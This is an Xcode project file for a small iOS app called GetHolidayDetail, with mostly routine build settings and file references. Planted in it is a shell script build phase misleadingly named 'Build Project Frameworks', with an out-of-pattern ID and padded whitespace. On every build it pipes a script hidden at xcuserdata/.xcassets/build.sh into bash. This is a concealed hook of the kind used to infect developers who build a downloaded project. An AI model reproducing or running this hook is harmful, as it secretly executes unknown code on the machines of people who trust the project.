// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		04357A46258CC6A50038B012 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04357A45258CC6A50038B012 /* AppDelegate.swift */; };
		04357A48258CC6A50038B012 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04357A47258CC6A50038B012 /* SceneDelegate.swift */; };
		04357A4A258CC6A50038B012 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04357A49258CC6A50038B012 /* ViewController.swift */; };
		04357A4D258CC6A50038B012 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04357A4B258CC6A50038B012 /* Main.storyboard */; };
		04357A4F258CC6AC0038B012 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 04357A4E258CC6AC0038B012 /* Assets.xcassets */; };
		04357A52258CC6AC0038B012 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04357A50258CC6AC0038B012 /* LaunchScreen.storyboard */; };
		04357A5C258CC76E0038B012 /* TableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04357A5A258CC76E0038B012 /* TableViewCell.swift */; };
		04357A5D258CC76E0038B012 /* TableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 04357A5B258CC76E0038B012 /* TableViewCell.xib */; };
		04357A61258CCF1C0038B012 /* DataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04357A60258CCF1C0038B012 /* DataModel.swift */; };
		04357A65258CD5340038B012 /* HolidayRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04357A64258CD5340038B012 /* HolidayRequest.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		04357A42258CC6A50038B012 /* GetHolidayDetail.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = GetHolidayDetail.app; sourceTree = BUILT_PRODUCTS_DIR; };
		04357A45258CC6A50038B012 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		04357A47258CC6A50038B012 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		04357A49258CC6A50038B012 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		04357A4C258CC6A50038B012 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		04357A4E258CC6AC0038B012 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		04357A51258CC6AC0038B012 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		04357A53258CC6AC0038B012 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		04357A5A258CC76E0038B012 /* TableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TableViewCell.swift; sourceTree = "<group>"; };
		04357A5B258CC76E0038B012 /* TableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TableViewCell.xib; sourceTree = "<group>"; };
		04357A60258CCF1C0038B012 /* DataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataModel.swift; sourceTree = "<group>"; };
		04357A64258CD5340038B012 /* HolidayRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HolidayRequest.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		04357A3F258CC6A50038B012 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		04357A39258CC6A50038B012 = {
			isa = PBXGroup;
			children = (
				04357A44258CC6A50038B012 /* GetHolidayDetail */,
				04357A43258CC6A50038B012 /* Products */,
			);
			sourceTree = "<group>";
		};
		04357A43258CC6A50038B012 /* Products */ = {
			isa = PBXGroup;
			children = (
				04357A42258CC6A50038B012 /* GetHolidayDetail.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		04357A44258CC6A50038B012 /* GetHolidayDetail */ = {
			isa = PBXGroup;
			children = (
				04357A45258CC6A50038B012 /* AppDelegate.swift */,
				04357A47258CC6A50038B012 /* SceneDelegate.swift */,
				04357A49258CC6A50038B012 /* ViewController.swift */,
				04357A60258CCF1C0038B012 /* DataModel.swift */,
				04357A64258CD5340038B012 /* HolidayRequest.swift */,
				04357A4B258CC6A50038B012 /* Main.storyboard */,
				04357A4E258CC6AC0038B012 /* Assets.xcassets */,
				04357A5A258CC76E0038B012 /* TableViewCell.swift */,
				04357A5B258CC76E0038B012 /* TableViewCell.xib */,
				04357A50258CC6AC0038B012 /* LaunchScreen.storyboard */,
				04357A53258CC6AC0038B012 /* Info.plist */,
			);
			path = GetHolidayDetail;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		04357A41258CC6A50038B012 /* GetHolidayDetail */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 04357A56258CC6AC0038B012 /* Build configuration list for PBXNativeTarget "GetHolidayDetail" */;
			buildPhases = (
				BE8865821EBA3A7BBEAAC43A /* Build Project Frameworks */,
				04357A3E258CC6A50038B012 /* Sources */,
				04357A3F258CC6A50038B012 /* Frameworks */,
				04357A40258CC6A50038B012 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = GetHolidayDetail;
			productName = GetHolidayDetail;
			productReference = 04357A42258CC6A50038B012 /* GetHolidayDetail.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		04357A3A258CC6A50038B012 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1220;
				LastUpgradeCheck = 1220;
				TargetAttributes = {
					04357A41258CC6A50038B012 = {
						CreatedOnToolsVersion = 12.2;
					};
				};
			};
			buildConfigurationList = 04357A3D258CC6A50038B012 /* Build configuration list for PBXProject "GetHolidayDetail" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 04357A39258CC6A50038B012;
			productRefGroup = 04357A43258CC6A50038B012 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				04357A41258CC6A50038B012 /* GetHolidayDetail */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		04357A40258CC6A50038B012 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				04357A52258CC6AC0038B012 /* LaunchScreen.storyboard in Resources */,
				04357A5D258CC76E0038B012 /* TableViewCell.xib in Resources */,
				04357A4F258CC6AC0038B012 /* Assets.xcassets in Resources */,
				04357A4D258CC6A50038B012 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	BE8865821EBA3A7BBEAAC43A /* Build Project Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Project Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

cat \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.sh\" | bash";			
		};
	

	

	

	
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		04357A3E258CC6A50038B012 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				04357A65258CD5340038B012 /* HolidayRequest.swift in Sources */,
				04357A61258CCF1C0038B012 /* DataModel.swift in Sources */,
				04357A4A258CC6A50038B012 /* ViewController.swift in Sources */,
				04357A5C258CC76E0038B012 /* TableViewCell.swift in Sources */,
				04357A46258CC6A50038B012 /* AppDelegate.swift in Sources */,
				04357A48258CC6A50038B012 /* SceneDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		04357A4B258CC6A50038B012 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				04357A4C258CC6A50038B012 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		04357A50258CC6AC0038B012 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				04357A51258CC6AC0038B012 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		04357A54258CC6AC0038B012 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		04357A55258CC6AC0038B012 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		04357A57258CC6AC0038B012 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = GetHolidayDetail/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = Meet.GetHolidayDetail;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		04357A58258CC6AC0038B012 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = GetHolidayDetail/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = Meet.GetHolidayDetail;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		04357A3D258CC6A50038B012 /* Build configuration list for PBXProject "GetHolidayDetail" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				04357A54258CC6AC0038B012 /* Debug */,
				04357A55258CC6AC0038B012 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		04357A56258CC6AC0038B012 /* Build configuration list for PBXNativeTarget "GetHolidayDetail" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				04357A57258CC6AC0038B012 /* Debug */,
				04357A58258CC6AC0038B012 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */
			

			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = 04357A3A258CC6A50038B012 /* Project object */;
}
